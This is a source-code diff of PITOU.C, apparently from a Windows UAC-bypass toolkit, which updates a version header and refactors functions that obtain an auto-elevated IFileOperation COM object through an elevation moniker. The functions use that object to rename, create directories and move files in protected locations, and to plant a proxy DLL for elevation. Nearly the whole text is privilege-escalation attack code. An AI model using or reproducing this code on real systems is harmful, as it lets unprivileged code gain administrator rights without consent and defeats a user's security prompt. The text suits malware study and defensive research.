@@ -4,9 +4,9 @@
 *
 *  TITLE:       PITOU.C
 *
-*  VERSION:     2.56
+*  VERSION:     2.70
 *
-*  DATE:        14 Feb 2017
+*  DATE:        25 Mar 2017
 *
 *  Leo Davidson based IFileOperation auto-elevation.
 *
@@ -29,11 +29,10 @@
 BOOL ucmMasqueradedRenameElementCOM(
     LPWSTR OldName,
     LPWSTR NewName
-    )
+)
 {
     BOOL                bCond = FALSE, bResult = FALSE;
     IFileOperation     *FileOperation1 = NULL;
-    BIND_OPTS3          bop;
     IShellItem         *psiDestDir = NULL;
     HRESULT             r = E_FAIL;
 
@@ -53,11 +52,12 @@ BOOL ucmMasqueradedRenameElementCOM(
             FileOperation1->lpVtbl->Release(FileOperation1);
         }
 
-        RtlSecureZeroMemory(&bop, sizeof(bop));
-        bop.cbStruct = sizeof(bop);
-        bop.dwClassContext = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER;
+        r = ucmMasqueradedCoGetObjectElevate(
+            T_CLSID_FileOperation,
+            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
+            &IID_IFileOperation, 
+            &FileOperation1);
 
-        r = CoGetObject(IFILEOP_ELEMONIKER, (BIND_OPTS *)&bop, &IID_IFileOperation, &FileOperation1);
         if (r != S_OK) {
             break;
         }
@@ -112,11 +112,10 @@ BOOL ucmMasqueradedRenameElementCOM(
 BOOL ucmMasqueradedCreateSubDirectoryCOM(
     LPWSTR ParentDirectory,
     LPWSTR SubDirectory
-    )
+)
 {
     BOOL                bCond = FALSE, bResult = FALSE;
     IFileOperation     *FileOperation1 = NULL;
-    BIND_OPTS3          bop;
     IShellItem         *psiDestDir = NULL;
     HRESULT             r = E_FAIL;
 
@@ -136,11 +135,12 @@ BOOL ucmMasqueradedCreateSubDirectoryCOM(
             FileOperation1->lpVtbl->Release(FileOperation1);
         }
 
-        RtlSecureZeroMemory(&bop, sizeof(bop));
-        bop.cbStruct = sizeof(bop);
-        bop.dwClassContext = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER;
+        r = ucmMasqueradedCoGetObjectElevate(
+            T_CLSID_FileOperation,
+            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
+            &IID_IFileOperation,
+            &FileOperation1);
 
-        r = CoGetObject(IFILEOP_ELEMONIKER, (BIND_OPTS *)&bop, &IID_IFileOperation, &FileOperation1);
         if (r != S_OK) {
             break;
         }
@@ -195,12 +195,11 @@ BOOL ucmMasqueradedCreateSubDirectoryCOM(
 BOOL ucmMasqueradedMoveFileCOM(
     LPWSTR SourceFileName,
     LPWSTR DestinationDir
-    )
+)
 {
     BOOL                cond = FALSE;
     IFileOperation     *FileOperation1 = NULL;
     IShellItem         *isrc = NULL, *idst = NULL;
-    BIND_OPTS3          bop;
     SHELLEXECUTEINFOW   shexec;
     HRESULT             r = E_FAIL;
 
@@ -209,7 +208,6 @@ BOOL ucmMasqueradedMoveFileCOM(
         if ((SourceFileName == NULL) || (DestinationDir == NULL))
             break;
 
-        RtlSecureZeroMemory(&bop, sizeof(bop));
         RtlSecureZeroMemory(&shexec, sizeof(shexec));
 
         r = CoCreateInstance(&CLSID_FileOperation, NULL,
@@ -223,10 +221,12 @@ BOOL ucmMasqueradedMoveFileCOM(
             FileOperation1->lpVtbl->Release(FileOperation1);
         }
 
-        bop.cbStruct = sizeof(bop);
-        bop.dwClassContext = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER;
+        r = ucmMasqueradedCoGetObjectElevate(
+            T_CLSID_FileOperation,
+            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
+            &IID_IFileOperation,
+            &FileOperation1);
 
-        r = CoGetObject(IFILEOP_ELEMONIKER, (BIND_OPTS *)&bop, &IID_IFileOperation, &FileOperation1);
         if (r != S_OK) {
             break;
         }
@@ -290,7 +290,7 @@ BOOL ucmMasqueradedMoveFileCOM(
 BOOL ucmStandardAutoElevation2(
     CONST PVOID ProxyDll,
     DWORD ProxyDllSize
-    )
+)
 {
     BOOL  cond = FALSE, bResult = FALSE;
     WCHAR SourceFilePathAndName[MAX_PATH + 1];
@@ -356,10 +356,10 @@ BOOL ucmStandardAutoElevation2(
 *
 */
 BOOL ucmStandardAutoElevation(
-    UACBYPASSMETHOD Method,
+    UCM_METHOD Method,
     CONST PVOID ProxyDll,
     DWORD ProxyDllSize
-    )
+)
 {
     BOOL	cond = FALSE, bResult = FALSE;
     WCHAR   szSourceDll[MAX_PATH * 2];
@@ -474,7 +474,7 @@ HRESULT ucmMasqueradedCoGetObjectElevate(
     _In_ DWORD dwClassContext,
     _In_ REFIID riid,
     _Outptr_ void **ppv
-    )
+)
 {
     HRESULT     r = E_FAIL;
     BIND_OPTS3  bop;
